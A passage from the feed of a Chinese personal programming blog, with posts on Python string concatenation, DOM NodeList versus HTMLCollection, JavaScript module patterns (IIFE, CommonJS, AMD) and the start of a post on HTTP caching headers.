&lt;p&gt;这里需要强调的是，在python2中，我们在两个字符串之间加单个逗号是返回一个连接后的字符串，但是在python3中是返回一个tuple.&lt;br&gt;&lt;figure class=&quot;highlight ruby&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt;&amp;gt; &lt;span class=&quot;comment&quot;&gt;# coding in python2&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt;&amp;gt; &lt;span class=&quot;string&quot;&gt;&quot;l love &quot;&lt;/span&gt;,&lt;span class=&quot;string&quot;&gt;&quot;python&quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;string&quot;&gt;&#39;l love python&#39;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;------------------------&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt;&amp;gt; &lt;span class=&quot;comment&quot;&gt;# coding in python3&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt;&amp;gt; &lt;span class=&quot;string&quot;&gt;&quot;l love &quot;&lt;/span&gt;,&lt;span class=&quot;string&quot;&gt;&quot;python&quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;(&lt;span class=&quot;string&quot;&gt;&#39;i love &#39;&lt;/span&gt;,&lt;span class=&quot;string&quot;&gt;&#39;python&#39;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;h4 id=&quot;类C语言的printf函数&quot;&gt;&lt;a href=&quot;#类C语言的printf函数&quot; class=&quot;headerlink&quot; title=&quot;类C语言的printf函数&quot;&gt;&lt;/a&gt;类C语言的printf函数&lt;/h4&gt;&lt;figure class=&quot;highlight ruby&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt;&amp;gt; &lt;span class=&quot;string&quot;&gt;&#39;%s,%s&#39;&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;%(&#39;tom&#39;, &#39;dava&#39;)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;string&quot;&gt;&#39;tom,dava&#39;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h4 id=&quot;list的join方法&quot;&gt;&lt;a href=&quot;#list的join方法&quot; class=&quot;headerlink&quot; title=&quot;list的join方法&quot;&gt;&lt;/a&gt;list的join方法&lt;/h4&gt;&lt;figure class=&quot;highlight ruby&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt;&amp;gt; l = [&lt;span class=&quot;string&quot;&gt;&#39;i&#39;&lt;/span&gt;, &lt;span class=&quot;string&quot;&gt;&#39;love&#39;&lt;/span&gt;, &lt;span class=&quot;string&quot;&gt;&#39;python&#39;&lt;/span&gt;]&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt;&amp;gt; l.join(&lt;span class=&quot;string&quot;&gt;&#39; &#39;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;string&quot;&gt;&#39;i love python&#39;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;这种方式和JS中的数组join方法一样。&lt;/p&gt;
&lt;h3 id=&quot;总结&quot;&gt;&lt;a href=&quot;#总结&quot; class=&quot;headerlink&quot; title=&quot;总结&quot;&gt;&lt;/a&gt;总结&lt;/h3&gt;&lt;p&gt;这些只是我在学习python过程自己的一些关于python中的字符串拼接的一些总结，如果以后发现了其他的处理方法，再做补充。&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;p&gt;这些天在利用零零碎碎的一些时间在学习python，发现了python这门语言在一定程度上很想javascript。都是弱类型、动态语言，都支持高阶函数(还有我看到了&lt;code&gt;闭包&lt;/code&gt;)，写法非常灵活，一上手觉得写起来非常舒服。python中管字符串类型叫&lt;code&gt;str&lt;/code&gt;，而不是大众化的&lt;code&gt;String&lt;/code&gt;，同样，它也是python中的一种对象，在python中&lt;code&gt;str&lt;/code&gt;的写法非常灵活(pythoner管这个叫优雅):)，特别是字符串的拼接拼接，其方法之丰富，让我对python这门语言有了很大的好感，这篇博文就是总结下python中的&lt;code&gt;str&lt;/code&gt; 字符串拼接。&lt;br&gt;
    
    </summary>
    
      <category term="python" scheme="http://summerGreenTea.github.io/categories/python/"/>
    
    
      <category term="python" scheme="http://summerGreenTea.github.io/tags/python/"/>
    
      <category term="str" scheme="http://summerGreenTea.github.io/tags/str/"/>
    
  </entry>
  
  <entry>
    <title>学习DOM中的NodeList与HTMLCollection</title>
    <link href="http://summerGreenTea.github.io/2015/12/01/nodelist-htmlcollection/"/>
    <id>http://summerGreenTea.github.io/2015/12/01/nodelist-htmlcollection/</id>
    <published>2015-12-01T14:23:11.000Z</published>
    <updated>2016-03-02T02:58:00.382Z</updated>
    
    <content type="html">&lt;p&gt;最近在看《Javascript高级程序设计》的时候，看到了这样一句话：“理解NodeList和HTMLCollection，是从整体上透彻理解DOM的关键所在。”，所以觉得应该写一篇关于NodeList和HTMLCollection的博客来好好了解和总结下这方面的知识点。&lt;br&gt;&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;Nodelist&quot;&gt;&lt;a href=&quot;#Nodelist&quot; class=&quot;headerlink&quot; title=&quot;Nodelist&quot;&gt;&lt;/a&gt;Nodelist&lt;/h2&gt;&lt;p&gt;NodeList是一个节点的集合(既可以包含元素和其他节点)，在DOM中，节点的类型总共有12种，通过判断节点的nodeType来判断节点的类型。&lt;/p&gt;
&lt;p&gt;我们可以通过Node.childNodes和document.querySelectAll()(返回NodeList的接口有很多，这里不一一列举，下同)来获取到一个NodeList对象。&lt;/p&gt;
&lt;p&gt;　　NodeList对象有个length属性和item()方法，length表示所获得的NodeList对象的节点个数，这里还是要强调的是节点，而item()可以传入一个索引来访问Nodelist中相应索引的元素。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;lt;body&amp;gt;
    &amp;lt;div id=&amp;quot;node&amp;quot;&amp;gt;
        文本节点
        &amp;lt;!-- 注释节点 --&amp;gt;
        &amp;lt;span&amp;gt;node1&amp;lt;/span&amp;gt;
        &amp;lt;span&amp;gt;node2&amp;lt;/span&amp;gt;
        &amp;lt;span&amp;gt;node3&amp;lt;/span&amp;gt;
    &amp;lt;/div&amp;gt;
&amp;lt;/body&amp;gt;
&amp;lt;script&amp;gt;
    var node = document.getElementById(&amp;apos;node&amp;apos;),
        nodeLists = node.childNodes
    console.log(nodeLists.length) //     输出为9
&amp;lt;/script&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;上面的HTML代码中，“文本节点”和父节点子节点的空格（连着的文本）算做一个文本节点，然后是一个注释节点和注释节点和元素节点之间的空格（换行会产生空格，空格算做文本节点）的文本节点，紧接着的是一个元素节点和元素节点之间的换行的文本节点，三个元素节点和元素节点间的两个文本节点，最后是最后得元素节点和父元素之间的空格产生的文本节点，总共是9个节点。&lt;/p&gt;
&lt;p&gt;NodeList对象的一大特点是它返回的内容是动态的（live）,也就是说我们上面代码获取nodeLists是类似于“指针”的东西，所以在下面代码中我们在获取了nodeLists之后再向node中插入一个创建的span标签后，发现获取到了nodeLists.length变为10了，但是querySelectorAll这个接口返回的nodeList对象比较特殊，它是个静态（static）的对象。而且是元素的集合。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;lt;body&amp;gt;
&amp;lt;div id=&amp;quot;node&amp;quot;&amp;gt;
    文本节点
    &amp;lt;!-- 注释节点 --&amp;gt;
    &amp;lt;span&amp;gt;node1&amp;lt;/span&amp;gt;
    &amp;lt;span&amp;gt;node2&amp;lt;/span&amp;gt;
    &amp;lt;span&amp;gt;node3&amp;lt;/span&amp;gt;
&amp;lt;/div&amp;gt;
&amp;lt;/body&amp;gt;
&amp;lt;script&amp;gt;
    var node = document.getElementById(&amp;apos;node&amp;apos;)
    var nodeLists = node.childNodes
    var queryNodes = node.querySelectorAll(&amp;apos;span&amp;apos;)
    node.appendChild(document.createElement(&amp;apos;span&amp;apos;))
    console.log(nodeLists.length)  // 输出为10
    console.log(queryNodes.length)  //输出为3
&amp;lt;/script&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&quot;HTMLCollection&quot;&gt;&lt;a href=&quot;#HTMLCollection&quot; class=&quot;headerlink&quot; title=&quot;HTMLCollection&quot;&gt;&lt;/a&gt;HTMLCollection&lt;/h2&gt;&lt;p&gt;HTMLCollection是元素集合，它和NodeList很像，有length属性来表示HTMLCollection对象的长度，也可以通过elements.item()传入元素索引来访问。当时它还有一个nameItem()方法，可以返回集合中name属性和id属性值得元素。HTMLDocument 接口的许多属性都是 HTMLCollection 对象，它提供了访问诸如表单、图像和链接等文档元素的便捷方式，比如document.images和document.forms的属性都是HTMLCollection对象。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;lt;body&amp;gt;
    &amp;lt;img src=&amp;quot;test.png&amp;quot; id=&amp;quot;image1&amp;quot;&amp;gt;
    &amp;lt;img src=&amp;quot;test.png&amp;quot; id=&amp;quot;image2&amp;quot;&amp;gt;
    &amp;lt;img src=&amp;quot;test.png&amp;quot; id=&amp;quot;image3&amp;quot;&amp;gt;
    &amp;lt;img src=&amp;quot;test.png&amp;quot; id=&amp;quot;image4&amp;quot;&amp;gt;
    &amp;lt;img src=&amp;quot;test.png&amp;quot; id=&amp;quot;image5&amp;quot;&amp;gt;
    &amp;lt;img src=&amp;quot;test.png&amp;quot; id=&amp;quot;image6&amp;quot;&amp;gt;
&amp;lt;/body&amp;gt;
&amp;lt;script&amp;gt;
    console.log(document.images.namedItem(&amp;apos;image1&amp;apos;)) //&amp;lt;img src=&amp;quot;test.png&amp;quot; id=&amp;quot;image1&amp;quot;&amp;gt;
&amp;lt;/script&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;HTMLCollection的集合和NodeList对象一样也是动态的，他们获取的都是节点或元素集合的一个引用。&lt;/p&gt;
&lt;h2 id=&quot;HTMLCollection和NodeList-实时性&quot;&gt;&lt;a href=&quot;#HTMLCollection和NodeList-实时性&quot; class=&quot;headerlink&quot; title=&quot;HTMLCollection和NodeList 实时性&quot;&gt;&lt;/a&gt;HTMLCollection和NodeList 实时性&lt;/h2&gt;&lt;p&gt;前面都说到了它们连个对象都不是历史文档状态的一个静态快照，而是实时性的，这个是一个非常令人惊讶的特性，它们能随着文档的改变而改变，这个是很值得我们注意的，我们在平常使用一些DOM 接口来返回一些DOM集合的时候，常常会忽视掉这些。&lt;br&gt;　HTMLCollection和NodeList的实时性非常有用，但是，我们有时要迭代一个NodeList或HTMLCollection对象的时候，我们通常会选择生成当前对象的一个快照或静态副本：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;var staticLists = Array.prototype.slice.call(nodeListorHtmlCollection, 0)
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;这样的话，我们就可以放心的对当前的DOM集合做一些删减和插入操作，这个在DOM密集操作的时候很有用。&lt;/p&gt;
&lt;p&gt;还有MDN上面提到了一个将NodeList转化为Array的DOM扩展原型的方法(&lt;a href=&quot;http://perfectionkills.com/whats-wrong-with-extending-the-dom/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;在IE6/7中存在危险&lt;/a&gt;)：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;var arrayMethods = Object.getOwnPropertyNames( Array.prototype );
arrayMethods.forEach( attachArrayMethodsToNodeList );
function attachArrayMethodsToNodeList(methodName)
{
    if(methodName !== &amp;quot;length&amp;quot;) {
        NodeList.prototype[methodName] = Array.prototype[methodName];
    }
};
var divs = document.getElementsByTagName( &amp;apos;div&amp;apos; );
var firstDiv = divs[ 0 ];
firstDiv.childNodes.forEach(function( divChild ){
    divChild.parentNode.style.color = &amp;apos;#0F0&amp;apos;;
});
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&quot;结语&quot;&gt;&lt;a href=&quot;#结语&quot; class=&quot;headerlink&quot; title=&quot;结语&quot;&gt;&lt;/a&gt;结语&lt;/h2&gt;&lt;p&gt;DOM最初设计是为了解析XML而设计的，之后沿用到HTML上。我们可以把DOM分为两部分 core 和 html,Core 部分提供最基础的 XML 解析API说明，HTML 部分专为 HTML 中的 DOM 解析添加其特有的 API。NodeList接口是在core中体现的，HTMLCollection则是在html部分，不同浏览器也会实现它们的不同接口，厂商联盟性质的规范组织出现会让这些更加规范，也不出现之前返回的是NodeList对象，但是却是静态的。&lt;br&gt;　这篇文章很多思想都是自己在平时和网上了一些博客中了解到了，其中加了很多自己的组织和理解，目的在于梳理下一些比较深入的知识点，如果写的有疏漏和错误之处，还请指出。&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;p&gt;最近在看《Javascript高级程序设计》的时候，看到了这样一句话：“理解NodeList和HTMLCollection，是从整体上透彻理解DOM的关键所在。”，所以觉得应该写一篇关于NodeList和HTMLCollection的博客来好好了解和总结下这方面的知识点。&lt;br&gt;
    
    </summary>
    
      <category term="前端" scheme="http://summerGreenTea.github.io/categories/%E5%89%8D%E7%AB%AF/"/>
    
    
      <category term="HTML" scheme="http://summerGreenTea.github.io/tags/HTML/"/>
    
  </entry>
  
  <entry>
    <title>学习javascript 模块化的总结(一)</title>
    <link href="http://summerGreenTea.github.io/2015/11/15/js-modularization-programming/"/>
    <id>http://summerGreenTea.github.io/2015/11/15/js-modularization-programming/</id>
    <published>2015-11-15T06:59:13.000Z</published>
    <updated>2016-03-02T07:44:48.532Z</updated>
    
    <content type="html">&lt;p&gt;最近在看React的东西，里面提到了现在最流行的前端模块加载器&lt;code&gt;webpack&lt;/code&gt;和&lt;code&gt;browersify&lt;/code&gt;。它们都是遵循AMD规范的模块加载器，也是前端工程化的一个重要标杆，所以写下这篇博客，算是这个阶段对Js模块化编程的一点小小梳理和总结吧!&lt;br&gt;&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;模块化历程&quot;&gt;&lt;a href=&quot;#模块化历程&quot; class=&quot;headerlink&quot; title=&quot;模块化历程&quot;&gt;&lt;/a&gt;模块化历程&lt;/h2&gt;&lt;p&gt;Long time ago，我们编写Javascript代码都是这样的：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;function a() {
    console.log(&amp;apos;this is a&amp;apos;)
}
function b() {
    console.log(&amp;apos;this is b&amp;apos;)
}
function c() {
    console.log(&amp;apos;this is c&amp;apos;)
}
..... ):
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;这样编写代码会出现很多问题，比如全局作用域的污染(这简直是前端开发人员的禁忌啊)，于是乎，又出现了一种新的写法,叫做&lt;code&gt;立即执行函数&lt;/code&gt;(Immediately-Invoked Function Expression,IIFE) ：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;var a = (function() {

        function b() {
            ...
        }
        function c() {
            ...
        }
        return {
            fb: b,
            fc: c
        }
    })();
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;它利用了函数可以在其内部创建一个局部作用域的特性来创建一个闭包，将所有要执行的代码绑定在其内部的活动对象上,我们还可以传入输入全局对象来配置依赖：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;var a = (function(_) {
    _.filter(....)

    })(underscore)
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&quot;利用Script标签加载&quot;&gt;&lt;a href=&quot;#利用Script标签加载&quot; class=&quot;headerlink&quot; title=&quot;利用Script标签加载&quot;&gt;&lt;/a&gt;利用Script标签加载&lt;/h2&gt;&lt;p&gt;上面的IIFE帮我们解决了Javascript依赖于全局作用域来进行连接的问题，实现了封装。好吧，接着问题又来了，我们组有a、b、c、d、e、f、g各自写了一个模块，那么我们在项目main中引用它们:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;//code in project main
&amp;lt;script src=&amp;quot;a.js&amp;quot;&amp;gt;&amp;lt;/script&amp;gt;
&amp;lt;script src=&amp;quot;b.js&amp;quot;&amp;gt;&amp;lt;/script&amp;gt;
&amp;lt;script src=&amp;quot;c.js&amp;quot;&amp;gt;&amp;lt;/script&amp;gt;
&amp;lt;script src=&amp;quot;d.js&amp;quot;&amp;gt;&amp;lt;/script&amp;gt;
&amp;lt;script src=&amp;quot;e.js&amp;quot;&amp;gt;&amp;lt;/script&amp;gt;
&amp;lt;script src=&amp;quot;f.js&amp;quot;&amp;gt;&amp;lt;/script&amp;gt;
&amp;lt;script src=&amp;quot;g.js&amp;quot;&amp;gt;&amp;lt;/script&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;这里有几个问题：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;难以维护&lt;/li&gt;
&lt;li&gt;如果这些模块之间有明确的调用关系的话（比如f需要用到a中的代码），那么必须保证调用的要加载在被调用的后面&lt;/li&gt;
&lt;li&gt;我们需要向服务器请求7次(7次，你知道向服务器请求7个文件要消耗多少时间、资源…..)&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&quot;CommonJS规范&quot;&gt;&lt;a href=&quot;#CommonJS规范&quot; class=&quot;headerlink&quot; title=&quot;CommonJS规范&quot;&gt;&lt;/a&gt;CommonJS规范&lt;/h2&gt;&lt;p&gt;CommonJS最先实现的在服务端，Let’s check it:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;// add.js
function add(a, b) {
    return a + b
}
exports.add = add

// main.js
var method = require(&amp;apos;./add&amp;apos;)
method.add(1, 2) // 输出为 3
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Node.js也是实现了CommonJS的规范来加载模块(详情看官网)，CommonJS主要分为模块引用、模块定义和模块标识。&lt;/p&gt;
&lt;h3 id=&quot;模块引入&quot;&gt;&lt;a href=&quot;#模块引入&quot; class=&quot;headerlink&quot; title=&quot;模块引入&quot;&gt;&lt;/a&gt;模块引入&lt;/h3&gt;&lt;p&gt;CommonJS定义了一个require()的全局函数来导入我们定义的模块倒当前上下文中。&lt;/p&gt;
&lt;h3 id=&quot;模块导出&quot;&gt;&lt;a href=&quot;#模块导出&quot; class=&quot;headerlink&quot; title=&quot;模块导出&quot;&gt;&lt;/a&gt;模块导出&lt;/h3&gt;&lt;p&gt;当我们写了一个模块后，想把它导出来，我们就使用module和exports，exports是module的属性，而module代表当前模块。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;//module
function a() {
    console.log(&amp;apos;a&amp;apos;)
}

module.exports = a  // var _a = require(&amp;apos;a&amp;apos;)  a()
 // or
exports.a = a       //var _a = require(&amp;apos;a&amp;apos;) _a.a()
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&quot;模块标识&quot;&gt;&lt;a href=&quot;#模块标识&quot; class=&quot;headerlink&quot; title=&quot;模块标识&quot;&gt;&lt;/a&gt;模块标识&lt;/h3&gt;&lt;p&gt;模块标识就是传递给require()的参数，它必须符合小驼峰命名法，或者是以&lt;strong&gt; .、.. &lt;/strong&gt; 开头路径或绝对路径，若以.js结尾的可以省略扩展名。&lt;/p&gt;
&lt;h2 id=&quot;AMD&quot;&gt;&lt;a href=&quot;#AMD&quot; class=&quot;headerlink&quot; title=&quot;AMD&quot;&gt;&lt;/a&gt;AMD&lt;/h2&gt;&lt;p&gt;在服务端我们可以使用CommonJS所规定的模块加载方式来加载模块，那么在浏览器端是否也用CommonJS来实现加载端模块呢？答案是否定的，在sever端，由于服务器的性能各方面要强与client端，而且在后端加载模块是相当于在本地加载，加载速度杠杠的。那么我们在浏览器上加载这些模块，一方面，我的模块代码都在服务器上，各种请求解析加载什么的，异步加载模块的方式显然用CommonJS的标准是很难实现的，那么需求来了，我们如何实现在浏览器端实现模块的加载，AMD来了。&lt;/p&gt;
&lt;p&gt;在AMD规范下，我们定义模块是这样的：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;define([&amp;apos;module/moduleA&amp;apos;,&amp;apos;module/moduleB&amp;apos;], function(moduleA, moduleB) {
    //  ...
    var a = moduleA.methodA();
    var b = moduleB.methodB();
    return {
        a: a,
        b: b
    }
})
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;define函数用于定义模块，第一个参数定义我们要定义的模块所依赖的模块，第二个参数传入传入一个回调函数，在依赖模块加载完成后传入回调函数中使用。让后通过require函数调用：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;require([&amp;apos;moudle/moduleC&amp;apos;], function(moduleC) {
    console.log(moduleC.a, moduleC.b);
})
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&quot;Require-js&quot;&gt;&lt;a href=&quot;#Require-js&quot; class=&quot;headerlink&quot; title=&quot;Require.js&quot;&gt;&lt;/a&gt;Require.js&lt;/h3&gt;&lt;p&gt;Request.js是一个实现了AMD的前端模块加载库。&lt;br&gt;关于Require.js的使用方法，篇幅有限，请移步查看&lt;a href=&quot;http://www.requirejs.cn/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;中文Docs&lt;/a&gt;。需要提的是require.js用了一种在CommonJS中来定义模块的方式来方便我们加载CommonJS规范的模块：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;define(function(require, exports, module) {
    var a = require(&amp;apos;module/moduleA&amp;apos;);
    exports.a = new a();
})
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;个人认为这才真正的按需加载和模块依赖，我在在我们需要的地方去加载这个模块，而不需要在一开始就写好模块来一起加载。&lt;/p&gt;
&lt;p&gt;未完待续……&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;p&gt;最近在看React的东西，里面提到了现在最流行的前端模块加载器&lt;code&gt;webpack&lt;/code&gt;和&lt;code&gt;browersify&lt;/code&gt;。它们都是遵循AMD规范的模块加载器，也是前端工程化的一个重要标杆，所以写下这篇博客，算是这个阶段对Js模块化编程的一点小小梳理和总结吧!&lt;br&gt;
    
    </summary>
    
      <category term="前端" scheme="http://summerGreenTea.github.io/categories/%E5%89%8D%E7%AB%AF/"/>
    
    
      <category term="JavaScript" scheme="http://summerGreenTea.github.io/tags/JavaScript/"/>
    
  </entry>
  
  <entry>
    <title>总结web-cache(缓存策略)</title>
    <link href="http://summerGreenTea.github.io/2015/11/14/web-cache/"/>
    <id>http://summerGreenTea.github.io/2015/11/14/web-cache/</id>
    <published>2015-11-14T14:17:22.000Z</published>
    <updated>2016-03-02T02:58:00.397Z</updated>
    
    <content type="html">&lt;p&gt;前端性能优化是个老生常谈的问题了，而优化http请求可谓是个&lt;code&gt;大头&lt;/code&gt;，如何在保证最小的请求数的同时能让加载的资源能和服务端保证一致性呢？好吧，就是http的缓存机制了。&lt;br&gt;&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;缓存原理&quot;&gt;&lt;a href=&quot;#缓存原理&quot; class=&quot;headerlink&quot; title=&quot;缓存原理&quot;&gt;&lt;/a&gt;缓存原理&lt;/h2&gt;&lt;p&gt;在浏览器端，我们定义缓存的一系列规则来告诉浏览器缓存的资源是什么、什么时候过期、如何验证资源来实现缓存资源重用等等，定义好后，浏览器和服务端通信得时候就会来验证这些规则来实现是否运用缓存的决定。&lt;/p&gt;
&lt;h2 id=&quot;使用HTML-Meta&quot;&gt;&lt;a href=&quot;#使用HTML-Meta&quot; class=&quot;headerlink&quot; title=&quot;使用HTML Meta&quot;&gt;&lt;/a&gt;使用HTML Meta&lt;/h2&gt;&lt;p&gt;我们可以在&lt;strong&gt;HTML Meta&lt;/strong&gt;中来定义当前的页面是否应该被缓存，比如&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;lt;meta http-equiv=&amp;quot;pragma&amp;quot; content=&amp;quot;no-cache&amp;quot;&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;这个meta标签告诉浏览器，当前的页面资源不被缓存，但是这种方式定义缓存只被部分浏览器支持，而且所有的缓存代理服务器都不支持，因为缓存代理服务器不会去解析HTML内容。&lt;/p&gt;
&lt;h2 id=&quot;使用HTTP-Header&quot;&gt;&lt;a href=&quot;#使用HTTP-Header&quot; class=&quot;headerlink&quot; title=&quot;使用HTTP Header&quot;&gt;&lt;/a&gt;使用HTTP Header&lt;/h2&gt;&lt;h3 id=&quot;Expires-策略&quot;&gt;&lt;a href=&quot;#Expires-策略&quot; class=&quot;headerlink&quot; title=&quot;Expires 策略&quot;&gt;&lt;/a&gt;Expires 策略&lt;/h3&gt;&lt;p&gt;Expires是web服务器的响应头信息，它的目的是告诉浏览器，缓存当前响应内容待Expires指定的时间。其实Expires指定的时间就是一个过期时间，当过期之前访问该资源浏览器都会从缓存中拉取。&lt;/p&gt;
&lt;h3 id=&quot;Cache-control&quot;&gt;&lt;a href=&quot;#Cache-control&quot; class=&quot;headerlink&quot; title=&quot;Cache-control&quot;&gt;&lt;/a&gt;Cache-control&lt;/h3&gt;&lt;p&gt;Cache-control和expires的作用相当，都是告诉浏览器当前资源的缓存有效期，Cache-control是http1.1的产物，当Cache-control和expires同时设置的时候，Cache-control的优先级更高。&lt;br&gt;Cache-control可以取以下的值：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Public 指示响应可被任何缓存区缓存&lt;/li&gt;
&lt;li&gt;Private指示对于单个用户的整个或部分响应消息，不能被共享缓存处理。这允许服务器仅仅描述当用户的部分响应消息，此响应消息对于其他用户的请求无效&lt;/li&gt;
&lt;li&gt;no-cache指示请求或响应消息不能缓存&lt;/li&gt;
&lt;li&gt;no-store 用于防止重要的信息被无意的发布。在请求消息中发送将使得请求和响应消息都不使用缓存&lt;/li&gt;
&lt;li&gt;max-age指示客户机可以接收生存期不大于指定时间（以秒为单位）的响应&lt;/li&gt;
&lt;li&gt;min-fresh 指示客户机可以接收响应时间小于当前时间加上指定时间的响应&lt;/li&gt;
&lt;li&gt;max-stale 指示客户机可以接收超出超时期间的响应消息。如果指定max-stale消息的值，那么客户机可以接收超出超时期指定值之内的响应消息&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;最常用的是max-age，通过max-age指定一个秒数来规定当前资源过期时间。&lt;br&gt;Cache-control的缓存策略有好几种，下面就一一介绍下：&lt;/p&gt;
&lt;h3 id=&quot;Last-Modified-If-since-Modeified&quot;&gt;&lt;a href=&quot;#Last-Modified-If-since-Modeified&quot; class=&quot;headerlink&quot; title=&quot;Last-Modified / If-since-Modeified&quot;&gt;&lt;/a&gt;Last-Modified / If-since-Modeified&lt;/h3&gt;&lt;p&gt;Last-Modified标识服务器上次修改该资源的时间，当客户端向服务端请求资源时，服务端通过Last-Modified告诉客户端当前资源最后被修改的时间，客户端记录下这个时间。当前资源过期了的时候（通过max-age设置的时间），客户端再想请求这个资源的时候，会向服务端发送if-since-Modified，服务接受到这个时间后，通过对比在服务器上这个资源最后修改的时间，如果If-since-Modified比较新，那么就返回304告诉浏览器表示资源未被修改，可以继续使用缓存，否则，重新响应当前资源。&lt;/p&gt;
